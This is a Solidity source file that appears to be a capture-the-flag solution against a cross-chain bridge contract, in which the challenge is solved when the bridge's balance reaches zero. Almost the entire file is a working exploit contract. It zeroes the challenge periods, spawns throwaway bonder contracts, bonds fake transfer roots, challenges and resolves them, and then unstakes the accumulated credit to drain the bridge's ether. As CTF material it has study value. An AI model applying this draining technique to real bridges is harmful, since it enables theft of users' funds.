pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

contract Challenge {
    address public immutable BRIDGE;

    constructor(address bridge) {
        BRIDGE = bridge;
    }

    function isSolved() external view returns (bool) {
        return BRIDGE.balance == 0;
    }
}

interface BridgeLike {
    function sendToL2(
        uint256 chainId,
        address recipient,
        uint256 amount,
        uint256 amountOutMin,
        uint256 deadline,
        address relayer,
        uint256 relayerFee
    ) external payable;

    function governance() external view returns (address);

    function setGovernance(address) external;
    function setChallengePeriod(uint256 _challengePeriod) external;
    function bondTransferRoot(
        bytes32 rootHash,
        uint256 destinationChainId,
        uint256 totalAmount
    ) external; 
    function addBonder(address bonder) external;
    function challengeTransferBond(bytes32 rootHash, uint256 originalAmount, uint256 destinationChainId) external payable;
    function resolveChallenge(bytes32 rootHash, uint256 originalAmount, uint256 destinationChainId) external;
    function getCredit(address bonder) external view returns (uint256);
    function unstake(uint256 amount) external;
    function setChallengeResolutionPeriod(uint256 _challengeResolutionPeriod) external;
    function getDebitAndAdditionalDebit(address) external view returns(uint256);
}

contract Bonder {
  function bond(BridgeLike bridge, bytes32 rootHash, uint256 chainId, uint256 totalAmount) public {
    bridge.bondTransferRoot(rootHash, chainId, totalAmount);
  }
}

contract Exp {
  BridgeLike public bridge;
  uint256[1000] public amounts;
  uint256 idx;

  function run(address challenge, uint256 cnt) public payable {
    bridge = BridgeLike(Challenge(challenge).BRIDGE());

    bridge.setChallengePeriod(0);
    bridge.setChallengeResolutionPeriod(0);


    console.log(address(bridge).balance);
    for (uint256 i = idx; i < idx + cnt; i++) {
      uint256 bridgeBalance = address(bridge).balance;
      uint256 amount = bridgeBalance * 10 >= 900 ether ? 900 ether : bridgeBalance * 10;
      amounts[i] = amount;
      if (amount == 0) continue;

      Bonder bonder = new Bonder();
      bridge.addBonder(address(bonder));
      bonder.bond(bridge, bytes32(i), 1, amount);
      bridge.challengeTransferBond{value: amount / 10}(bytes32(i), amount, 1);
    }

    idx += cnt;
  }

  function challenge(uint256 cnt) public {
    for (uint256 i = idx - cnt; i < idx; i++) {
      if (amounts[i] == 0) continue;
      bridge.resolveChallenge(bytes32(i), amounts[i], 1);
      
    }
    uint256 credit = bridge.getCredit(address(this)) - bridge.getDebitAndAdditionalDebit(address(this));    
    uint256 bridgeBalance = address(bridge).balance;
    if (credit > bridgeBalance) credit = bridgeBalance;
    bridge.unstake(credit);
    console.log(address(bridge).balance);
  }

  receive() external payable {}
}
